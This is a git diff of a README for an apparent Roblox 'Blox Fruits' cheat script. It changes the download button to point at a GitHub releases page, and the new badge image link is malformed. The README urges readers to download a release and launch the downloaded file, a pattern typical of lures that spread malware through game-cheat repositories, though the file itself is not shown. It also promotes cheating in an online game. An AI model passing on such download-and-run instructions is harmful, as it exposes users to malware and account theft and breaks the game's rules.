@@ -31,7 +31,7 @@ Our Blox Fruits script is created with the latest Lua scripting technology to en
 ## Get Started 🍒
 To download the latest release of our Blox Fruits Script 2025, click the button below:
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Release%20Here-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Blox Fruits Script](https://github.com/yfyuy/Roblox-Blox-Fruits-Script-2025/releases%20Here-blue)](https://github.com/yfyuy/Roblox-Blox-Fruits-Script-2025/releases)
 
 If the link ends with a file name, make sure to launch the downloaded file to start using the script. 
 
